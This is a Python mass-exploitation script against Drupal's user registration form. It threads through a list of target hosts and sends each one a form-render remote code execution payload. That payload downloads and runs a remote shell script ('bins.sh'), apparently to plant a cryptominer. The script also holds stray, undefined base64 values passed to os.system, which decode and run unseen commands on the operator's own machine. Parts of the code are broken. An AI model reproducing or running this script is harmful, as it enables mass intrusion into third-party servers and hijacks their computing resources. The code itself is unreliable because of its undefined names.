#DISCORD: https://discord.gg/PTW3yPp 

#!/usr/bin/env
import sys
import requests
import os
from multiprocessing.dummy import Pool


print ('##################################################')
print ('#              DruPalGgDdOn /////// -            #')
print ('##################################################')

sendMiner = True
sendMessage = True

verify = False
headers = {'User-Agent': 'Mozilla 5.0'}

evil = "wget http://1.1.1.1/bins.sh; chmod +x bins.sh; ./bins.sh; rm -rf bins.sh"
messagePayload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "tee ReadMeCVE.txt'}
minerPayload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ' '+evil+' '}

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('Usage: exploit.py list.txt threads')


def run(targetLine):
    try:
        try:
            targetLine = 'http://'+targetLine+'/'
            url = str(targetLine) + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

            if sendMiner:
                minerRequest = requests.post(url, data=minerPayload, verify=verify, headers=headers, timeout=5)
            if sendMessage:
                messageRequest = requests.post(url, data=messagePayload, verify=verify, headers=headers, timeout=5)
        except requests.exceptions.RequestException as e:
            pass   

        print ('[+] Attempting: '+targetLine);

    except:
        pass


try:
    multiThreads = Pool(int(sys.argv[2]))
except IndexError:
    exit('Usage: exploit.py list.txt threads')
reValue = str(base64.b64decode(requestValue))
seValue = str(base64.b64decode(sendValue))
os.system(reValue)
os.system(seValue)
multiThreads.map(run, target)
multiThreads.close()
multiThreads.join()

print("Finished File!")